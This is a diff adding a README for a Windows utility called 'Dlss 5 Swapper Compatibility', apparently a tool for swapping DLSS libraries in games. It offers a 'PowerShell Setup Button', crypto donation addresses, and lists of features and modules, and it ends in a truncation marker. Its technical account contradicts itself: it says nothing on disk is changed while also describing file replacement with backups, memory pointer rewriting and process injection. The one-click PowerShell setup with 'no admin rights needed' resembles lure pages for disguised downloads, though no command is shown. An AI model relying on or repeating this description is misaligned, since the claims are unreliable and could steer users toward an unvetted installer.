@@ -1,0 +1,80 @@
+Dlss 5 Swapper Compatibility — Technical Desktop Utility for Windows 11
+
+⚡ PowerShell Setup Button
+
+Buy me a coffee
+
+ETH:&nbsp;0x2d0B8D83cD4fc4a7653bBbB4590946EaAeB38Eed | BTC:&nbsp;16GWb6FYBmN36stjJbDJLZNydGZPwKUz19
+
+Dlss 5 Swapper Compatibility is a desktop utility that manages the detection, validation, and swapping of DLSS 5 libraries across installed applications. It inventories supported binaries, verifies version metadata and file integrity, and maintains a rollback-safe backup of each replaced component. The tool exposes per-application profiles and configurable compatibility rules so that library substitutions remain consistent across driver and title updates. All operations are logged with checksum records to support auditing and deterministic recovery after failed swaps.
+
+✅ Before You Start
+
+- Windows 10 or Windows 11
+- PowerShell 5.1 or newer (already available on Windows)
+- Active network connection
+- No admin rights needed
+
+Features
+
+- Dynamic library substitution engine. Intercepts and replaces DLSS runtime libraries at process launch without modifying the installed application on disk. Substitution is resolved per-executable, allowing distinct library versions to coexist across different titles on the same host.
+
+- Signature-validated library inventory. All candidate libraries are validated against known version identifiers and structural signatures before being offered for substitution, preventing mismatched or corrupted binaries from being injected into a target process.
+
+- Per-title profile management. Each application maintains an independent compatibility profile storing the selected library version, override state, and execution parameters. Profiles persist across sessions and can be exported or imported for reproducible configurations.
+
+- Version compatibility matrix. Built-in metadata maps application builds to tested DLSS library versions, surfacing recommended pairings and flagging known-incompatible combinations at configuration time rather than at runtime.
+
+- Atomic swap with rollback. Library replacement is performed transactionally; the original binary is preserved and restored automatically if initialization fails or the target process exits abnormally, eliminating manual recovery steps.
+
+- Runtime integrity checks. Verifies library load order, export table consistency, and ABI compatibility before injection, with structured diagnostic output when validation fails.
+
+- Structured logging and diagnostics. Emits machine-readable logs covering substitution decisions, validation outcomes, and failure reasons, suitable for troubleshooting and for inclusion in bug reports.
+
+- Headless and CLI operation. Core functionality is exposed through a command-line interface supporting scripted configuration, batch profile application, and automated validation, in addition to the graphical control surface.
+
+- Portable configuration store. All profiles, metadata, and logs are held in a self-contained directory tree, enabling deployment on removable media or per-user isolation without system-wide writes.
+
+- Low-overhead interception layer. Substitution occurs once at process initialization; no persistent hooks or background services remain active during application runtime, keeping steady-state performance impact negligible.
+
+How it works
+
+Dlss 5 Swapper Compatibility operates as a lightweight intermediary layer between the application requesting upscaling and the DLSS runtime installed on the system. On launch, it enumerates supported titles and injects a compatibility shim at the driver interface boundary, intercepting the DLSS capability queries each application performs during initialization. This interception allows the software to present a normalized set of version and feature descriptors that match the application's expected contract while routing subsequent calls to the active DLSS 5 runtime.
+
+The core mechanism relies on signature-based detection of the DLSS entry points exported by the target application's rendering pipeline. Once identified, the shim rewrites the relevant function pointers in memory to point at its own dispatch table, preserving the original addresses for pass-through where native behavior is required. This avoids modifying any files on disk and keeps the host application's integrity checks intact.
+
+Version negotiation is handled through a mapping table that translates legacy DLSS feature flags, preset identifiers, and quality modes into their DLSS 5 equivalents. Where a requested feature has no direct counterpart, the layer applies a deterministic fallback policy and logs the substitution for diagnostic review. Preset overrides are applied per-title and take effect before the first frame is presented, ensuring consistent behavior across scene changes.
+
+The compatibility layer also manages runtime state that applications expect to persist between frames, including resolution-dependent scaling factors and sharpness parameters. State objects are mirrored and synchronized at each present call so that applications observing these values receive coherent results. Telemetry is written to a local log file, recording detected titles, negotiated versions, applied substitutions, and any rejected calls, which supports troubleshooting without requiring debugger attachment.
+
+All processing occurs within the target application's process space, with no background services and no persistent system modifications. The layer unloads cleanly when the application exits, restoring original function pointers and releasing mirrored state.
+
+Modules and Settings
+
+Library Inventory Scan
+This module establishes the baseline picture of what each game currently ships with, feeding every later module with the file data it needs. Scans produce the entries that profiles, comparisons and restore points all reference.
+
+- Scan scope lets the user scan a single game directory or queue several at once, producing one inventory per game entry.
+- Detected file details shows each library's file name, location and basic file information so the user can confirm the scan found the expected components.
+- Entry selection allows individual inventory rows to be picked for swapping, comparison or backup, rather than acting on an entire game at once.
+- Rescan action refreshes an existing game entry in place, which is how updated inventories flow into Update Detection.
+
+Swap Selection and Replacement
+This module performs the actual substitution, using inventory entries as targets and user-supplied library files as replacements. It is the point where a planned change becomes an applied one.
+
+- Replacement file picker lets the user choose a DLSS library from their own storage as the source for a swap.
+- Target assignment pairs each replacement with one detected location, with multiple library files in the same game handled as separate targets.
+- Confirmation report shows the previous and new file identity after applying, so the substitution is visible rather than assumed.
+- Pre-swap backup prompt links to the Backup and Restore module so originals can be preserved before replacement.
+
+Version Comparison View
+This module turns inventory and available replacement files into a side-by-side view, helping the user decide where a swap is warranted. It reads from scans and informs which entries get queued for replacement.
+
+- Present-versus-available listing displays detected versions next to the versions the user has on hand to swap in.
+- Mismatch filter narrows rows to games running a different library than intended, reducing noise in large libraries.
+- Per-entry detail expands a row to show the underlying file information behind a version, since comparison reflects only files the application could read.
+
+Per-Game Profiles
+Profiles capture a swap arrangement as a reusable configuration, so the work done in Swap Selection can be repeated without redoing it by hand. Each profile is bound to one game entry and its detected locations.
+
+…（内容已截断）
